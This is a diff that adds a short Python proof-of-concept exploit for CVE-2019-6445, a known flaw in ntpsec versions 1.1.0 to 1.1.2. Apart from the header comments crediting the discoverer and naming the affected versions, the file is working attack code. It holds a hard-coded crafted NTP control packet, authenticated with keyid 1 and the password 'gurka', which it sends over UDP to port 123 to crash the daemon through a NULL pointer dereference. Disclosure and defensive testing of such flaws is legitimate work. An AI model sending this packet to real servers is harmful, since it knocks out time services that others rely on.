@@ -1,0 +1,20 @@
+#!/usr/bin/env python
+# Exploit Title: ntpsec 1.1.2 authenticated NULL pointer exception Proof of concept
+# Bug Discovery: Magnus Klaaborg Stubman (@magnusstubman)
+# Exploit Author: Magnus Klaaborg Stubman (@magnusstubman)
+# Website: https://dumpco.re/bugs/ntpsec-authed-npe 
+# Vendor Homepage: https://ntpsec.org/ 
+# Software Link: ftp://ftp.ntpsec.org/pub/releases/ntpsec-1.1.2.tar.gz 
+# Affected versions: ntpsec 1.1.0, 1.1.1, 1.1.2
+# CVE: CVE-2019-6445
+# Note: this PoC uses Keyid 1 with password 'gurka'
+
+import sys
+import socket
+
+buf = ("\x16\x03\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x6c\x65\x61\x70" +
+       "\x00\x00\x00\x01\x5c\xb7\x3c\xdc\x9f\x5c\x1e\x6a\xc5\x9b\xdf\xf5" +
+       "\x56\xc8\x07\xd4")
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(buf, ('127.0.0.1', 123))
